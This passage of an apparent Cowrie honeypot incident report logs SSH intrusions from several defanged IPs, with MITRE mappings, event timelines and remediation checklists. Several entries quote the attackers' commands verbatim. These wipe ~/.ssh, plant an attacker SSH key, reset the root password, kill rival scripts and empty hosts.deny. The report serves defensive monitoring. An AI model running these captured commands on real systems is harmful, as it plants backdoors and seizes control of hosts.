| `2026-06-15 02:05:08` | `cowrie.session.params` |
| `2026-06-15 02:05:08` | `cowrie.command.input` |
| `2026-06-15 02:05:08` | `cowrie.session.file_download` |
| `2026-06-15 02:05:08` | `cowrie.log.closed` |
| `2026-06-15 02:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2554721928b5

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:05 |
| **Last Seen** | 2026-06-15 02:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:05:11` | `cowrie.session.connect` |
| `2026-06-15 02:05:11` | `cowrie.client.version` |
| `2026-06-15 02:05:11` | `cowrie.client.kex` |
| `2026-06-15 02:05:12` | `cowrie.login.success` |
| `2026-06-15 02:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72b6354afa3

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:14 |
| **Last Seen** | 2026-06-15 02:15 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Uyq6PicoydCi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:14:51` | `cowrie.session.connect` |
| `2026-06-15 02:14:51` | `cowrie.client.version` |
| `2026-06-15 02:14:52` | `cowrie.client.kex` |
| `2026-06-15 02:14:52` | `cowrie.login.success` |
| `2026-06-15 02:14:53` | `cowrie.session.params` |
| `2026-06-15 02:14:53` | `cowrie.command.input` |
| `2026-06-15 02:14:53` | `cowrie.command.failed` |
| `2026-06-15 02:14:53` | `cowrie.log.closed` |
| `2026-06-15 02:14:54` | `cowrie.session.params` |
| `2026-06-15 02:14:54` | `cowrie.command.input` |
| `2026-06-15 02:14:54` | `cowrie.session.file_download` |
| `2026-06-15 02:14:54` | `cowrie.log.closed` |
| `2026-06-15 02:15:04` | `cowrie.session.params` |
| `2026-06-15 02:15:04` | `cowrie.command.input` |
| `2026-06-15 02:15:05` | `cowrie.log.closed` |
| `2026-06-15 02:15:05` | `cowrie.session.params` |
| `2026-06-15 02:15:05` | `cowrie.command.input` |
| `2026-06-15 02:15:06` | `cowrie.log.closed` |
| `2026-06-15 02:15:06` | `cowrie.session.params` |
| `2026-06-15 02:15:06` | `cowrie.command.input` |
| `2026-06-15 02:15:06` | `cowrie.session.file_download` |
| `2026-06-15 02:15:06` | `cowrie.log.closed` |
| `2026-06-15 02:15:07` | `cowrie.session.params` |
| `2026-06-15 02:15:07` | `cowrie.command.input` |
| `2026-06-15 02:15:07` | `cowrie.log.closed` |
| `2026-06-15 02:15:07` | `cowrie.session.params` |
| `2026-06-15 02:15:07` | `cowrie.command.input` |
| `2026-06-15 02:15:08` | `cowrie.log.closed` |
| `2026-06-15 02:15:08` | `cowrie.session.params` |
| `2026-06-15 02:15:08` | `cowrie.command.input` |
| `2026-06-15 02:15:08` | `cowrie.command.input` |
| `2026-06-15 02:15:08` | `cowrie.log.closed` |
| `2026-06-15 02:15:09` | `cowrie.session.params` |
| `2026-06-15 02:15:09` | `cowrie.command.input` |
| `2026-06-15 02:15:09` | `cowrie.log.closed` |
| `2026-06-15 02:15:09` | `cowrie.session.params` |
| `2026-06-15 02:15:09` | `cowrie.command.input` |
| `2026-06-15 02:15:10` | `cowrie.log.closed` |
| `2026-06-15 02:15:10` | `cowrie.session.params` |
| `2026-06-15 02:15:10` | `cowrie.command.input` |
| `2026-06-15 02:15:10` | `cowrie.log.closed` |
| `2026-06-15 02:15:11` | `cowrie.session.params` |
| `2026-06-15 02:15:11` | `cowrie.command.input` |
| `2026-06-15 02:15:11` | `cowrie.log.closed` |
| `2026-06-15 02:15:11` | `cowrie.session.params` |
| `2026-06-15 02:15:11` | `cowrie.command.input` |
| `2026-06-15 02:15:12` | `cowrie.log.closed` |
| `2026-06-15 02:15:12` | `cowrie.session.params` |
| `2026-06-15 02:15:12` | `cowrie.command.input` |
| `2026-06-15 02:15:12` | `cowrie.log.closed` |
| `2026-06-15 02:15:13` | `cowrie.session.params` |
| `2026-06-15 02:15:13` | `cowrie.command.input` |
| `2026-06-15 02:15:13` | `cowrie.log.closed` |
| `2026-06-15 02:15:13` | `cowrie.session.params` |
| `2026-06-15 02:15:13` | `cowrie.command.input` |
| `2026-06-15 02:15:14` | `cowrie.log.closed` |
| `2026-06-15 02:15:14` | `cowrie.session.params` |
| `2026-06-15 02:15:14` | `cowrie.command.input` |
| `2026-06-15 02:15:14` | `cowrie.log.closed` |
| `2026-06-15 02:15:15` | `cowrie.session.params` |
| `2026-06-15 02:15:15` | `cowrie.command.input` |
| `2026-06-15 02:15:15` | `cowrie.log.closed` |
| `2026-06-15 02:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255ae0b5eaaa

| Field | Detail |
|---|---|
| **Source IP** | `180.184.178[.]165` |
| **First Seen** | 2026-06-15 02:20 |
| **Last Seen** | 2026-06-15 02:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:20:19` | `cowrie.session.connect` |
| `2026-06-15 02:20:19` | `cowrie.client.version` |
| `2026-06-15 02:20:19` | `cowrie.client.kex` |
| `2026-06-15 02:20:20` | `cowrie.login.success` |
| `2026-06-15 02:20:20` | `cowrie.session.params` |
| `2026-06-15 02:20:20` | `cowrie.command.input` |
| `2026-06-15 02:20:20` | `cowrie.command.failed` |
| `2026-06-15 02:20:20` | `cowrie.log.closed` |
| `2026-06-15 02:20:20` | `cowrie.session.params` |
| `2026-06-15 02:20:20` | `cowrie.command.input` |
| `2026-06-15 02:20:20` | `cowrie.session.file_download` |
| `2026-06-15 02:20:20` | `cowrie.log.closed` |
| `2026-06-15 02:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.184.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0271b8dc13ba

| Field | Detail |
|---|---|
| **Source IP** | `180.184.178[.]165` |
| **First Seen** | 2026-06-15 02:20 |
| **Last Seen** | 2026-06-15 02:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:20:23` | `cowrie.session.connect` |
| `2026-06-15 02:20:23` | `cowrie.client.version` |
| `2026-06-15 02:20:23` | `cowrie.client.kex` |
| `2026-06-15 02:20:23` | `cowrie.login.success` |
| `2026-06-15 02:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.184.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a1b6f0e352

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-15 02:31 |
| **Last Seen** | 2026-06-15 02:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:31:15` | `cowrie.session.connect` |
| `2026-06-15 02:31:15` | `cowrie.client.version` |
| `2026-06-15 02:31:15` | `cowrie.client.kex` |
| `2026-06-15 02:31:16` | `cowrie.login.success` |
| `2026-06-15 02:31:16` | `cowrie.session.params` |
| `2026-06-15 02:31:16` | `cowrie.command.input` |
| `2026-06-15 02:31:16` | `cowrie.command.failed` |
| `2026-06-15 02:31:16` | `cowrie.log.closed` |
| `2026-06-15 02:31:17` | `cowrie.session.params` |
| `2026-06-15 02:31:17` | `cowrie.command.input` |
| `2026-06-15 02:31:17` | `cowrie.session.file_download` |
| `2026-06-15 02:31:17` | `cowrie.log.closed` |
| `2026-06-15 02:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff900146445

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-15 02:31 |
| **Last Seen** | 2026-06-15 02:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:31:19` | `cowrie.session.connect` |
| `2026-06-15 02:31:19` | `cowrie.client.version` |
| `2026-06-15 02:31:19` | `cowrie.client.kex` |
| `2026-06-15 02:31:20` | `cowrie.login.success` |
| `2026-06-15 02:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62a2dd56e91

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:34 |
| **Last Seen** | 2026-06-15 02:34 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:34:23` | `cowrie.session.connect` |
| `2026-06-15 02:34:23` | `cowrie.client.version` |
| `2026-06-15 02:34:24` | `cowrie.client.kex` |
| `2026-06-15 02:34:24` | `cowrie.login.success` |
| `2026-06-15 02:34:25` | `cowrie.session.params` |
| `2026-06-15 02:34:25` | `cowrie.command.input` |
| `2026-06-15 02:34:25` | `cowrie.command.failed` |
| `2026-06-15 02:34:25` | `cowrie.log.closed` |
| `2026-06-15 02:34:25` | `cowrie.session.params` |
| `2026-06-15 02:34:25` | `cowrie.command.input` |
| `2026-06-15 02:34:26` | `cowrie.session.file_download` |
| `2026-06-15 02:34:26` | `cowrie.log.closed` |
| `2026-06-15 02:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4631605c32f2

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:34 |
| **Last Seen** | 2026-06-15 02:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:34:36` | `cowrie.session.connect` |
| `2026-06-15 02:34:36` | `cowrie.client.version` |
| `2026-06-15 02:34:37` | `cowrie.client.kex` |
| `2026-06-15 02:34:37` | `cowrie.login.success` |
| `2026-06-15 02:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bacd2516ba9c

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-15 02:35 |
| **Last Seen** | 2026-06-15 02:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:35:18` | `cowrie.session.connect` |
| `2026-06-15 02:35:18` | `cowrie.client.version` |
| `2026-06-15 02:35:18` | `cowrie.client.kex` |
| `2026-06-15 02:35:19` | `cowrie.login.success` |
| `2026-06-15 02:35:19` | `cowrie.session.params` |
| `2026-06-15 02:35:19` | `cowrie.command.input` |
| `2026-06-15 02:35:19` | `cowrie.command.failed` |
| `2026-06-15 02:35:20` | `cowrie.log.closed` |
| `2026-06-15 02:35:20` | `cowrie.session.params` |
| `2026-06-15 02:35:20` | `cowrie.command.input` |
| `2026-06-15 02:35:20` | `cowrie.session.file_download` |
| `2026-06-15 02:35:20` | `cowrie.log.closed` |
| `2026-06-15 02:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27557c19f3f

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-15 02:35 |
| **Last Seen** | 2026-06-15 02:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:35:22` | `cowrie.session.connect` |
| `2026-06-15 02:35:22` | `cowrie.client.version` |
| `2026-06-15 02:35:22` | `cowrie.client.kex` |
| `2026-06-15 02:35:23` | `cowrie.login.success` |
| `2026-06-15 02:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b376c8d719e

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-06-15 02:37 |
| **Last Seen** | 2026-06-15 02:37 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pYULD3KPNzGp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:37:22` | `cowrie.session.connect` |
| `2026-06-15 02:37:22` | `cowrie.client.version` |
| `2026-06-15 02:37:22` | `cowrie.client.kex` |
| `2026-06-15 02:37:23` | `cowrie.login.success` |
| `2026-06-15 02:37:23` | `cowrie.session.params` |
| `2026-06-15 02:37:23` | `cowrie.command.input` |
| `2026-06-15 02:37:23` | `cowrie.command.failed` |
| `2026-06-15 02:37:23` | `cowrie.log.closed` |
| `2026-06-15 02:37:23` | `cowrie.session.params` |
| `2026-06-15 02:37:23` | `cowrie.command.input` |
| `2026-06-15 02:37:24` | `cowrie.session.file_download` |
| `2026-06-15 02:37:24` | `cowrie.log.closed` |
| `2026-06-15 02:37:34` | `cowrie.session.params` |
| `2026-06-15 02:37:34` | `cowrie.command.input` |
| `2026-06-15 02:37:34` | `cowrie.log.closed` |
| `2026-06-15 02:37:34` | `cowrie.session.params` |
| `2026-06-15 02:37:34` | `cowrie.command.input` |
| `2026-06-15 02:37:35` | `cowrie.log.closed` |
| `2026-06-15 02:37:35` | `cowrie.session.params` |
| `2026-06-15 02:37:35` | `cowrie.command.input` |
| `2026-06-15 02:37:35` | `cowrie.session.file_download` |
| `2026-06-15 02:37:35` | `cowrie.log.closed` |
| `2026-06-15 02:37:35` | `cowrie.session.params` |
| `2026-06-15 02:37:35` | `cowrie.command.input` |
| `2026-06-15 02:37:36` | `cowrie.log.closed` |
| `2026-06-15 02:37:36` | `cowrie.session.params` |
| `2026-06-15 02:37:36` | `cowrie.command.input` |
| `2026-06-15 02:37:36` | `cowrie.log.closed` |
| `2026-06-15 02:37:36` | `cowrie.session.params` |
| `2026-06-15 02:37:36` | `cowrie.command.input` |
| `2026-06-15 02:37:36` | `cowrie.command.input` |
| `2026-06-15 02:37:37` | `cowrie.log.closed` |
| `2026-06-15 02:37:37` | `cowrie.session.params` |
| `2026-06-15 02:37:37` | `cowrie.command.input` |
| `2026-06-15 02:37:37` | `cowrie.log.closed` |
| `2026-06-15 02:37:37` | `cowrie.session.params` |
| `2026-06-15 02:37:37` | `cowrie.command.input` |
| `2026-06-15 02:37:37` | `cowrie.log.closed` |
| `2026-06-15 02:37:38` | `cowrie.session.params` |
| `2026-06-15 02:37:38` | `cowrie.command.input` |
| `2026-06-15 02:37:38` | `cowrie.log.closed` |
| `2026-06-15 02:37:38` | `cowrie.session.params` |
| `2026-06-15 02:37:38` | `cowrie.command.input` |
| `2026-06-15 02:37:38` | `cowrie.log.closed` |
| `2026-06-15 02:37:39` | `cowrie.session.params` |
| `2026-06-15 02:37:39` | `cowrie.command.input` |
| `2026-06-15 02:37:39` | `cowrie.log.closed` |
| `2026-06-15 02:37:39` | `cowrie.session.params` |
| `2026-06-15 02:37:39` | `cowrie.command.input` |
| `2026-06-15 02:37:39` | `cowrie.log.closed` |
| `2026-06-15 02:37:40` | `cowrie.session.params` |
| `2026-06-15 02:37:40` | `cowrie.command.input` |
| `2026-06-15 02:37:40` | `cowrie.log.closed` |
| `2026-06-15 02:37:40` | `cowrie.session.params` |
| `2026-06-15 02:37:40` | `cowrie.command.input` |
| `2026-06-15 02:37:40` | `cowrie.log.closed` |
| `2026-06-15 02:37:41` | `cowrie.session.params` |
| `2026-06-15 02:37:41` | `cowrie.command.input` |
| `2026-06-15 02:37:41` | `cowrie.log.closed` |
| `2026-06-15 02:37:41` | `cowrie.session.params` |
| `2026-06-15 02:37:41` | `cowrie.command.input` |
| `2026-06-15 02:37:41` | `cowrie.log.closed` |
| `2026-06-15 02:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.188.177[.]46` to AbuseIPDB if not already reported
- [ ] Block `103.188.177[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ccfae74bbff

| Field | Detail |
|---|---|
| **Source IP** | `223.247.218[.]112` |
| **First Seen** | 2026-06-15 02:37 |
| **Last Seen** | 2026-06-15 02:38 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XEUe07vr8uUW"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:37:43` | `cowrie.session.connect` |
| `2026-06-15 02:37:43` | `cowrie.client.version` |
| `2026-06-15 02:37:44` | `cowrie.client.kex` |
| `2026-06-15 02:37:45` | `cowrie.login.success` |
| `2026-06-15 02:37:45` | `cowrie.session.params` |
